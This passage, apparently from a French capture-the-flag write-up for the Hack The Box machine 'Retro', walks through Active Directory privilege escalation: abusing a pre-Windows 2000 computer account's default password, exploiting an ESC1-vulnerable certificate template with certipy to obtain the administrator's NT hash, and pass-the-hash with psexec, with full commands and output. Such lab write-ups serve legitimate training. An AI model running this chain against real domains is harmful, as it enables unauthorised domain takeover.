+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">╭─root at exegol-htb in /workspace/Retro
+</span></span><span class="line"><span class="cl">╰─○ cat ToDo.txt
+</span></span><span class="line"><span class="cl">Thomas,
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">after convincing the finance department to get rid of their ancienct banking software it is finally time to clean up the mess they made. We should start with the pre created computer account. That one is older than me.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Best
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">James
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">╭─root at exegol-htb in /workspace/Retro
+</span></span><span class="line"><span class="cl">╰─○ cat user.txt
+</span></span><span class="line"><span class="cl">cbda362cff2099072c5e96c51712ff33</span></span></code></pre></div></div>
+<h2 id="shell-en-tant-que-administrator">Shell en tant que administrator</h2>
+<h3 id="bloodhound">BloodHound</h3>
+<p>Maintenant que j&rsquo;ai un compte et des identifiants valides, j&rsquo;utilise <code>BloodHound</code> pour avoir un aperçu des relations dans le domaine. Après y avoir passé quelques minutes, je n&rsquo;ai rien de vraiment intéressant.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">╭─</span><span class="n">root</span> <span class="n">at</span> <span class="n">exegol</span><span class="o">-</span><span class="n">htb</span> <span class="ow">in</span> <span class="o">/</span><span class="n">workspace</span><span class="o">/</span><span class="n">Retro</span>
+</span></span><span class="line"><span class="cl"><span class="err">╰─○</span> <span class="n">bloodhound</span><span class="o">-</span><span class="n">python</span> <span class="o">-</span><span class="n">u</span> <span class="s1">&#39;trainee&#39;</span> <span class="o">-</span><span class="n">p</span> <span class="s1">&#39;trainee&#39;</span> <span class="o">-</span><span class="n">d</span> <span class="n">retro</span><span class="o">.</span><span class="n">vl</span> <span class="o">-</span><span class="n">c</span> <span class="n">All</span> <span class="o">--</span><span class="n">zip</span> <span class="o">-</span><span class="n">ns</span> <span class="mf">10.129</span><span class="o">.</span><span class="mf">26.76</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">BloodHound</span><span class="o">.</span><span class="n">py</span> <span class="k">for</span> <span class="n">BloodHound</span> <span class="n">LEGACY</span> <span class="p">(</span><span class="n">BloodHound</span> <span class="mf">4.2</span> <span class="ow">and</span> <span class="mf">4.3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="n">AD</span> <span class="n">domain</span><span class="p">:</span> <span class="n">retro</span><span class="o">.</span><span class="n">vl</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Getting</span> <span class="n">TGT</span> <span class="k">for</span> <span class="n">user</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">LDAP</span> <span class="n">server</span><span class="p">:</span> <span class="n">dc</span><span class="o">.</span><span class="n">retro</span><span class="o">.</span><span class="n">vl</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">1</span> <span class="n">domains</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">1</span> <span class="n">domains</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">forest</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">2</span> <span class="n">computers</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">LDAP</span> <span class="n">server</span><span class="p">:</span> <span class="n">dc</span><span class="o">.</span><span class="n">retro</span><span class="o">.</span><span class="n">vl</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">7</span> <span class="n">users</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">53</span> <span class="n">groups</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">2</span> <span class="n">gpos</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">1</span> <span class="n">ous</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">19</span> <span class="n">containers</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Found</span> <span class="mi">0</span> <span class="n">trusts</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Starting</span> <span class="n">computer</span> <span class="n">enumeration</span> <span class="n">with</span> <span class="mi">10</span> <span class="n">workers</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Querying</span> <span class="n">computer</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Querying</span> <span class="n">computer</span><span class="p">:</span> <span class="n">DC</span><span class="o">.</span><span class="n">retro</span><span class="o">.</span><span class="n">vl</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Done</span> <span class="ow">in</span> <span class="mi">00</span><span class="n">M</span> <span class="mi">09</span><span class="n">S</span>
+</span></span><span class="line"><span class="cl"><span class="n">INFO</span><span class="p">:</span> <span class="n">Compressing</span> <span class="n">output</span> <span class="n">into</span> <span class="mi">20250624193733</span><span class="n">_bloodhound</span><span class="o">.</span><span class="n">zip</span></span></span></code></pre></div></div>
+<h3 id="pre-created-computer-account">Pre Created Computer Account</h3>
+<p>Maintenant revenons sur ce que nous dis le fichier <code>ToDo.txt</code>. Lorsqu&rsquo;un nouveau compte d&rsquo;ordinateur est configuré comme <code>pre-Windows 2000 computer</code>, son mot de passe est généralement le nom du compte machine en minuscule. Lors de mon énumération SMB j&rsquo;avais trouvé deux comptes machines, <code>DC$</code> et <code>BANKING$</code>. Je teste et je vois que c&rsquo;est le compte BANKING$ qui présente l&rsquo;attribut <code>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nxc smb retro.vl -u &#39;BANKING$&#39; -p &#39;banking&#39;</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Retro/5.png"
+        data-srcset="/images/Retro/5.png, /images/Retro/5.png 1.5x, /images/Retro/5.png 2x"
+        data-sizes="auto"
+        alt="/images/Retro/5.png"
+        title="/images/Retro/5.png" width="1823" height="143" /></p>
+<p>Je change le mot de passe du compte <code>BANKING$</code> à l&rsquo;aide de <a href="https://github.com/fortra/impacket/blob/master/examples/changepasswd.py" target="_blank" rel="noopener noreffer ">changepasswd.py</a>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">╭─root at exegol-htb in /workspace/Retro
+</span></span><span class="line"><span class="cl">╰─○ changepasswd.py retro.vl/BANKING\$:banking@10.129.234.44 -newpass Password@2025 -p rpc-samr
+</span></span><span class="line"><span class="cl">Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Changing the password of retro.vl\BANKING$
+</span></span><span class="line"><span class="cl">[*] Connecting to DCE/RPC as retro.vl\BANKING$
+</span></span><span class="line"><span class="cl">[*] Password was changed successfully.</span></span></code></pre></div></div>
+<h3 id="esc1">ESC1</h3>
+<p>Une fois le mot de passe changé, j&rsquo;énumère les certificats vulnérables. Je trouve le Template <code>RetroClients</code> qui est vulnérable à une <code>ESC1</code>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">╭─root at exegol-htb in /workspace/Retro
+</span></span><span class="line"><span class="cl">╰─○ certipy find -u &#39;BANKING$&#39; -p &#39;Password@2025&#39; -dc-ip 10.129.234.44 -vulnerable -stdout
+</span></span><span class="line"><span class="cl">Certipy v4.8.2 - by Oliver Lyak (ly4k)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Finding certificate templates
+</span></span><span class="line"><span class="cl">[*] Found 34 certificate templates
+</span></span><span class="line"><span class="cl">[*] Finding certificate authorities
+</span></span><span class="line"><span class="cl">[*] Found 1 certificate authority
+</span></span><span class="line"><span class="cl">[*] Found 12 enabled certificate templates
+</span></span><span class="line"><span class="cl">[*] Trying to get CA configuration for &#39;retro-DC-CA&#39; via CSRA
+</span></span><span class="line"><span class="cl">[!] Got error while trying to get CA configuration for &#39;retro-DC-CA&#39; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+</span></span><span class="line"><span class="cl">[*] Trying to get CA configuration for &#39;retro-DC-CA&#39; via RRP
+</span></span><span class="line"><span class="cl">[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+</span></span><span class="line"><span class="cl">[*] Got CA configuration for &#39;retro-DC-CA&#39;
+</span></span><span class="line"><span class="cl">[*] Enumeration output:
+</span></span><span class="line"><span class="cl">Certificate Authorities
+</span></span><span class="line"><span class="cl">  0
+</span></span><span class="line"><span class="cl">    CA Name                             : retro-DC-CA
+</span></span><span class="line"><span class="cl">    DNS Name                            : DC.retro.vl
+</span></span><span class="line"><span class="cl">    Certificate Subject                 : CN=retro-DC-CA, DC=retro, DC=vl
+</span></span><span class="line"><span class="cl">    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85
+</span></span><span class="line"><span class="cl">    Certificate Validity Start          : 2023-07-23 21:03:51+00:00
+</span></span><span class="line"><span class="cl">    Certificate Validity End            : 2028-07-23 21:13:50+00:00
+</span></span><span class="line"><span class="cl">    Web Enrollment                      : Disabled
+</span></span><span class="line"><span class="cl">    User Specified SAN                  : Disabled
+</span></span><span class="line"><span class="cl">    Request Disposition                 : Issue
+</span></span><span class="line"><span class="cl">    Enforce Encryption for Requests     : Enabled
+</span></span><span class="line"><span class="cl">    Permissions
+</span></span><span class="line"><span class="cl">      Owner                             : RETRO.VL\Administrators
+</span></span><span class="line"><span class="cl">      Access Rights
+</span></span><span class="line"><span class="cl">        ManageCertificates              : RETRO.VL\Administrators
+</span></span><span class="line"><span class="cl">                                          RETRO.VL\Domain Admins
+</span></span><span class="line"><span class="cl">                                          RETRO.VL\Enterprise Admins
+</span></span><span class="line"><span class="cl">        ManageCa                        : RETRO.VL\Administrators
+</span></span><span class="line"><span class="cl">                                          RETRO.VL\Domain Admins
+</span></span><span class="line"><span class="cl">                                          RETRO.VL\Enterprise Admins
+</span></span><span class="line"><span class="cl">        Enroll                          : RETRO.VL\Authenticated Users
+</span></span><span class="line"><span class="cl">Certificate Templates
+</span></span><span class="line"><span class="cl">  0
+</span></span><span class="line"><span class="cl">    Template Name                       : RetroClients
+</span></span><span class="line"><span class="cl">    Display Name                        : Retro Clients
+</span></span><span class="line"><span class="cl">    Certificate Authorities             : retro-DC-CA
+</span></span><span class="line"><span class="cl">    Enabled                             : True
+</span></span><span class="line"><span class="cl">    Client Authentication               : True
+</span></span><span class="line"><span class="cl">    Enrollment Agent                    : False
+</span></span><span class="line"><span class="cl">    Any Purpose                         : False
+</span></span><span class="line"><span class="cl">    Enrollee Supplies Subject           : True
+</span></span><span class="line"><span class="cl">    Certificate Name Flag               : EnrolleeSuppliesSubject
+</span></span><span class="line"><span class="cl">    Enrollment Flag                     : None
+</span></span><span class="line"><span class="cl">    Private Key Flag                    : 16842752
+</span></span><span class="line"><span class="cl">    Extended Key Usage                  : Client Authentication
+</span></span><span class="line"><span class="cl">    Requires Manager Approval           : False
+</span></span><span class="line"><span class="cl">    Requires Key Archival               : False
+</span></span><span class="line"><span class="cl">    Authorized Signatures Required      : 0
+</span></span><span class="line"><span class="cl">    Validity Period                     : 1 year
+</span></span><span class="line"><span class="cl">    Renewal Period                      : 6 weeks
+</span></span><span class="line"><span class="cl">    Minimum RSA Key Length              : 4096
+</span></span><span class="line"><span class="cl">    Permissions
+</span></span><span class="line"><span class="cl">      Enrollment Permissions
+</span></span><span class="line"><span class="cl">        Enrollment Rights               : RETRO.VL\Domain Admins
+</span></span><span class="line"><span class="cl">                                          RETRO.VL\Domain Computers
+</span></span><span class="line"><span class="cl">                                          RETRO.VL\Enterprise Admins
+</span></span><span class="line"><span class="cl">      Object Control Permissions
+</span></span><span class="line"><span class="cl">        Owner                           : RETRO.VL\Administrator
+</span></span><span class="line"><span class="cl">        Write Owner Principals          : RETRO.VL\Domain Admins
+</span></span><span class="line"><span class="cl">                                          RETRO.VL\Enterprise Admins
+</span></span><span class="line"><span class="cl">                                          RETRO.VL\Administrator
+</span></span><span class="line"><span class="cl">        Write Dacl Principals           : RETRO.VL\Domain Admins
+</span></span><span class="line"><span class="cl">                                          RETRO.VL\Enterprise Admins
+</span></span><span class="line"><span class="cl">                                          RETRO.VL\Administrator
+</span></span><span class="line"><span class="cl">        Write Property Principals       : RETRO.VL\Domain Admins
+</span></span><span class="line"><span class="cl">                                          RETRO.VL\Enterprise Admins
+</span></span><span class="line"><span class="cl">                                          RETRO.VL\Administrator
+</span></span><span class="line"><span class="cl">    [!] Vulnerabilities
+</span></span><span class="line"><span class="cl">      ESC1                              : &#39;RETRO.VL\\Domain Computers&#39; can enroll, enrollee supplies subject and template allows client authentication</span></span></code></pre></div></div>
+<p>Maintenant à l&rsquo;aide de <code>certipy</code>, je fais une demande de certificat en tant que l&rsquo;utilisateur <code>administrator</code>. J&rsquo;obtiens une erreur <code>Got error while trying to request certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template</code>. Pour régler cela, j&rsquo;ajoute à la commande l&rsquo;option <code>-key-size 4096</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">certipy req -u &#39;BANKING$@retro.vl&#39; -p &#34;Password@2025&#34; -dc-ip &#34;10.129.234.44&#34; -target &#34;dc.retro.vl&#34; -ca &#39;retro-DC-CA&#39; -template &#39;RetroClients&#39; -upn &#39;administrator&#39; -debug</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/Retro/6.png"
+        data-srcset="/images/Retro/6.png, /images/Retro/6.png 1.5x, /images/Retro/6.png 2x"
+        data-sizes="auto"
+        alt="/images/Retro/6.png"
+        title="/images/Retro/6.png" width="1909" height="272" /></p>
+<p>Mais ce n&rsquo;est pas tout. Je ne sais pas trop pourquoi, mais la machine voulais à tout pris le SID de l&rsquo;administrateur. Or je ne l&rsquo;ai pas. Sauf que je connais la <a href="https://www.it-connect.fr/a-la-decouverte-des-sid-sous-windows/#IV_Les_SID_communs_ou_Well-known_SID" target="_blank" rel="noopener noreffer ">structure des SID</a>, il me suffit de récupérer le SID de <code>BANKING$</code> (en utilisant l&rsquo;option <code>debug</code> on obtiens le <code>SID</code> de <code>BANKING$</code>) et de changer le <code>RID</code> par <code>500</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">╭─root at exegol-htb in /workspace/Retro
+</span></span><span class="line"><span class="cl">╰─○ certipy req -u &#39;BANKING$@retro.vl&#39; -p &#34;Password@2025&#34; -dc-ip &#34;10.129.234.44&#34; -target &#34;dc.retro.vl&#34; -ca &#39;retro-DC-CA&#39; -template &#39;RetroClients&#39; -upn &#39;Administrator@retro.vl&#39; -key-size 4096 -sid &#39;S-1-5-21-2983547755-698260136-4283918172-500&#39;
+</span></span><span class="line"><span class="cl">Certipy v4.8.2 - by Oliver Lyak (ly4k)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Requesting certificate via RPC
+</span></span><span class="line"><span class="cl">[*] Successfully requested certificate
+</span></span><span class="line"><span class="cl">[*] Request ID is 18
+</span></span><span class="line"><span class="cl">[*] Got certificate with UPN &#39;Administrator@retro.vl&#39;
+</span></span><span class="line"><span class="cl">[*] Certificate object SID is &#39;S-1-5-21-2983547755-698260136-4283918172-500&#39;
+</span></span><span class="line"><span class="cl">[*] Saved certificate and private key to &#39;administrator.pfx&#39;</span></span></code></pre></div></div>
+<p>Ensuite je m&rsquo;authentifie avec ce certificat, ce qui me donne le hash NTLM de l&rsquo;utilisateur <code>administrator</code>.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">╭─root at exegol-htb in /workspace/Retro
+</span></span><span class="line"><span class="cl">╰─○ certipy auth -pfx administrator.pfx                                                                                                                     Certipy v4.8.2 - by Oliver Lyak (ly4k)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Using principal: administrator@retro.vl
+</span></span><span class="line"><span class="cl">[*] Trying to get TGT...
+</span></span><span class="line"><span class="cl">[*] Got TGT
+</span></span><span class="line"><span class="cl">[*] Saved credential cache to &#39;administrator.ccache&#39;
+</span></span><span class="line"><span class="cl">[*] Trying to retrieve NT hash for &#39;administrator&#39;
+</span></span><span class="line"><span class="cl">[*] Got hash for &#39;administrator@retro.vl&#39;: aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389</span></span></code></pre></div></div>
+<p>J&rsquo;obtiens un shell avec <code>psexec</code> et je récupère le second flag.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">╭─</span><span class="n">root</span> <span class="n">at</span> <span class="n">exegol</span><span class="o">-</span><span class="n">htb</span> <span class="ow">in</span> <span class="o">/</span><span class="n">workspace</span><span class="o">/</span><span class="n">Retro</span>
+</span></span><span class="line"><span class="cl"><span class="err">╰─○</span> <span class="n">psexec</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">hashes</span> <span class="p">:</span><span class="s2">&#34;252fac7066d93dd009d4fd2cd0368389&#34;</span> <span class="s2">&#34;retro.vl&#34;</span><span class="o">/</span><span class="s2">&#34;administrator&#34;</span><span class="err">@</span><span class="s2">&#34;10.129.234.44&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Impacket</span> <span class="n">v0</span><span class="o">.</span><span class="mf">13.0</span><span class="o">.</span><span class="n">dev0</span><span class="o">+</span><span class="mf">20250107.155526</span><span class="o">.</span><span class="mi">3</span><span class="n">d734075</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Requesting</span> <span class="n">shares</span> <span class="n">on</span> <span class="mf">10.129</span><span class="o">.</span><span class="mf">234.44</span><span class="o">.....</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="n">writable</span> <span class="n">share</span> <span class="n">ADMIN</span><span class="o">$</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Uploading</span> <span class="n">file</span> <span class="n">vxhatLHs</span><span class="o">.</span><span class="n">exe</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">SVCManager</span> <span class="n">on</span> <span class="mf">10.129</span><span class="o">.</span><span class="mf">234.44</span><span class="o">.....</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Creating</span> <span class="n">service</span> <span class="n">zkTj</span> <span class="n">on</span> <span class="mf">10.129</span><span class="o">.</span><span class="mf">234.44</span><span class="o">.....</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">service</span> <span class="n">zkTj</span><span class="o">.....</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="n">Press</span> <span class="n">help</span> <span class="k">for</span> <span class="n">extra</span> <span class="n">shell</span> <span class="n">commands</span>
+</span></span><span class="line"><span class="cl"><span class="n">Microsoft</span> <span class="n">Windows</span> <span class="p">[</span><span class="n">Version</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">20348.3453</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="o">.</span> <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">system32</span><span class="o">&gt;</span> <span class="n">cd</span> <span class="o">/</span><span class="n">users</span><span class="o">/</span><span class="n">administrator</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span><span class="o">&gt;</span> <span class="n">dir</span>
+</span></span><span class="line"><span class="cl"> <span class="n">Volume</span> <span class="ow">in</span> <span class="n">drive</span> <span class="n">C</span> <span class="n">has</span> <span class="n">no</span> <span class="n">label</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"> <span class="n">Volume</span> <span class="n">Serial</span> <span class="n">Number</span> <span class="n">is</span> <span class="mi">4</span><span class="n">BCB</span><span class="o">-</span><span class="n">B13C</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="ne">Directory</span> <span class="n">of</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mi">05</span><span class="o">/</span><span class="mi">05</span><span class="o">/</span><span class="mi">2025</span>  <span class="mi">03</span><span class="p">:</span><span class="mi">51</span> <span class="n">AM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="mi">07</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2023</span>  <span class="mi">01</span><span class="p">:</span><span class="mi">47</span> <span class="n">PM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="o">..</span>
+</span></span><span class="line"><span class="cl"><span class="mi">07</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2023</span>  <span class="mi">01</span><span class="p">:</span><span class="mi">48</span> <span class="n">PM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="mi">3</span><span class="n">D</span> <span class="n">Objects</span>
+</span></span><span class="line"><span class="cl"><span class="mi">07</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2023</span>  <span class="mi">01</span><span class="p">:</span><span class="mi">48</span> <span class="n">PM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="n">Contacts</span>
+</span></span><span class="line"><span class="cl"><span class="mi">05</span><span class="o">/</span><span class="mi">05</span><span class="o">/</span><span class="mi">2025</span>  <span class="mi">04</span><span class="p">:</span><span class="mi">55</span> <span class="n">AM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="n">Desktop</span>
+</span></span><span class="line"><span class="cl"><span class="mi">07</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2023</span>  <span class="mi">01</span><span class="p">:</span><span class="mi">48</span> <span class="n">PM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="n">Documents</span>
+</span></span><span class="line"><span class="cl"><span class="mi">07</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2023</span>  <span class="mi">01</span><span class="p">:</span><span class="mi">48</span> <span class="n">PM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="n">Downloads</span>
+</span></span><span class="line"><span class="cl"><span class="mi">07</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2023</span>  <span class="mi">01</span><span class="p">:</span><span class="mi">48</span> <span class="n">PM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="n">Favorites</span>
+</span></span><span class="line"><span class="cl"><span class="mi">07</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2023</span>  <span class="mi">01</span><span class="p">:</span><span class="mi">48</span> <span class="n">PM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="n">Links</span>
+</span></span><span class="line"><span class="cl"><span class="mi">07</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2023</span>  <span class="mi">01</span><span class="p">:</span><span class="mi">48</span> <span class="n">PM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="n">Music</span>
+</span></span><span class="line"><span class="cl"><span class="mi">07</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2023</span>  <span class="mi">01</span><span class="p">:</span><span class="mi">48</span> <span class="n">PM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="n">Pictures</span>
+</span></span><span class="line"><span class="cl"><span class="mi">07</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2023</span>  <span class="mi">01</span><span class="p">:</span><span class="mi">48</span> <span class="n">PM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="n">Saved</span> <span class="n">Games</span>
+</span></span><span class="line"><span class="cl"><span class="mi">07</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2023</span>  <span class="mi">01</span><span class="p">:</span><span class="mi">48</span> <span class="n">PM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="n">Searches</span>
+</span></span><span class="line"><span class="cl"><span class="mi">07</span><span class="o">/</span><span class="mi">23</span><span class="o">/</span><span class="mi">2023</span>  <span class="mi">01</span><span class="p">:</span><span class="mi">48</span> <span class="n">PM</span>    <span class="o">&lt;</span><span class="n">DIR</span><span class="o">&gt;</span>          <span class="n">Videos</span>
